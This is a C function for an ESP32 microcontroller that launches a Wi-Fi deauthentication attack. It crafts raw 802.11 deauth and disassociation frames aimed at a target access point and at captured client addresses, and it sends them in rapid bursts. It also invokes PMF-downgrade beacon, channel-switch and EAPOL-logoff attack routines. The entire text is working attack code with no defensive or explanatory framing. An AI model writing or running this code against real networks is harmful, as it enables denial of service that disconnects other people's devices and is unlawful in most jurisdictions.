void sendPowerfulDeauth(){
  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t rc[]={1,2,4,5,6,7,8,0xC,0xD,0xF,0x18,0x1C,0x28};
  int nr=13;
  uint8_t p[4][26];
  p[0][0]=0xC0;p[1][0]=0xC0;p[2][0]=0xA0;p[3][0]=0xA0;
  for(int v=0;v<4;v++){p[v][1]=0;p[v][2]=0x3A;p[v][3]=1;}
  memcpy(&p[0][4],bc,6);memcpy(&p[0][10],targetBSSID,6);memcpy(&p[0][16],targetBSSID,6);
  memcpy(&p[1][4],targetBSSID,6);memcpy(&p[1][10],bc,6);memcpy(&p[1][16],targetBSSID,6);
  memcpy(&p[2][4],bc,6);memcpy(&p[2][10],targetBSSID,6);memcpy(&p[2][16],targetBSSID,6);
  memcpy(&p[3][4],targetBSSID,6);memcpy(&p[3][10],bc,6);memcpy(&p[3][16],targetBSSID,6);
  
  sendPMFDowngradeBeacon();
  
  for(int i=0;i<50;i++){
    uint8_t r=rc[i%nr];
    p[0][24]=r;p[1][24]=r;p[2][24]=r;p[3][24]=r;
    p[0][25]=0;p[1][25]=0;p[2][25]=0;p[3][25]=0;
    uint16_t s0=(seqNum&0x0FFF)<<4,s1=((seqNum+1)&0x0FFF)<<4,s2=((seqNum+2)&0x0FFF)<<4,s3=((seqNum+3)&0x0FFF)<<4;
    p[0][22]=s0&0xFF;p[0][23]=(s0>>8)&0xFF;
    p[1][22]=s1&0xFF;p[1][23]=(s1>>8)&0xFF;
    p[2][22]=s2&0xFF;p[2][23]=(s2>>8)&0xFF;
    p[3][22]=s3&0xFF;p[3][23]=(s3>>8)&0xFF;
    seqNum=(seqNum+4)&0x0FFF;
    esp_wifi_80211_tx(WIFI_IF_AP,p[0],26,false);
    esp_wifi_80211_tx(WIFI_IF_AP,p[1],26,false);
    esp_wifi_80211_tx(WIFI_IF_AP,p[2],26,false);
    esp_wifi_80211_tx(WIFI_IF_AP,p[3],26,false);
    esp_wifi_80211_tx(WIFI_IF_STA,p[0],26,false);
    esp_wifi_80211_tx(WIFI_IF_STA,p[1],26,false);
    if(i%20==0)delay(1);
  }
  
  for(int c=0;c<capturedClientCount&&c<20;c++){
    uint8_t dc[26];dc[0]=0xC0;dc[1]=0;dc[2]=0x3A;dc[3]=1;
    memcpy(&dc[4],capturedClients[c],6);memcpy(&dc[10],targetBSSID,6);memcpy(&dc[16],targetBSSID,6);
    dc[24]=7;dc[25]=0;
    uint16_t s=(seqNum&0x0FFF)<<4;dc[22]=s&0xFF;dc[23]=(s>>8)&0xFF;
    seqNum=(seqNum+1)&0x0FFF;
    for(int r=0;r<10;r++){
      esp_wifi_80211_tx(WIFI_IF_AP,dc,26,false);
      esp_wifi_80211_tx(WIFI_IF_STA,dc,26,false);
    }
  }
  
  sendCSAAttack();
  sendEAPOLLogoff();
  sendPMFDowngradeBeacon();
}

